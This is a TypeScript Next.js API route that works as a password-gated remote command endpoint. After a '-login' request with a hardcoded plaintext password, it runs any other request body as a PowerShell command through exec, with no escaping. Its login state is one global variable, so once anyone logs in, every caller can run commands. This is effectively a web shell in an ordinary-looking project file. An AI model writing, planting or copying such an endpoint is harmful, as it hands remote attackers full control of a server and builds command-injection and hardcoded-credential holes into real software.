import type { NextApiRequest, NextApiResponse } from 'next'
import { exec } from "child_process"

let nowPassword = ""
const password = "Ldokdlidk_YT"

const Prefix = "-"
const getdataPrefix = "?"

export default function hendler(req: NextApiRequest, res: NextApiResponse) {
  if (req.body.startsWith(Prefix) || req.body.startsWith(getdataPrefix)) {

    if (req.body.startsWith(Prefix)) {
      let command = req.body.slice(Prefix.length)

      //login
      if (command.startsWith("login")) {
        // if (nowPassword == password) {
        //   return
        // }

        nowPassword = command.slice(("login ").length)

        if (nowPassword == password) {
          res.status(200).json({ type: "login", message: "oh yeh you login!", code: "Login" })
          return
        }

        res.status(200).json({ type: "login", message: "password not correct", code: "!Login" })
      } else
        //logout
        if (command.startsWith("logout")) {
          nowPassword = ""
          res.status(200).json({ type: "logout", content: "ok done", code: "isLogout" })
        } else {
          res.status(200).json({ type: "error", message: "unknow-commsnd", code: "unkcmd" })
        }
    } else if (req.body.startsWith(getdataPrefix)) {
      let command = req.body.slice(getdataPrefix.length)

      //isLogin
      if (command.startsWith("isLogin")) {
        if (nowPassword == password) {
          res.status(200).json({ type: "isLogin?", message: "yes, you login", code: "isLogin" })
          return
        }
        res.status(200).json({ type: "isLogin?", message: "no, you not login", code: "!isLogin" })
      } else {
        res.status(200).json({ type: "error", message: "unknow-commsnd", code: "unkcmd" })
      }
    }
  } else {
    if (nowPassword == password) {
      exec("powershell " + req.body)
      res.status(200).json({ type: "commandline", path: req.body, code: "isOk" });
      return
    }
    res.status(200).json({ type: "commandline", message: "you don`t have a permissions", code: "notPermissions" })
  }
}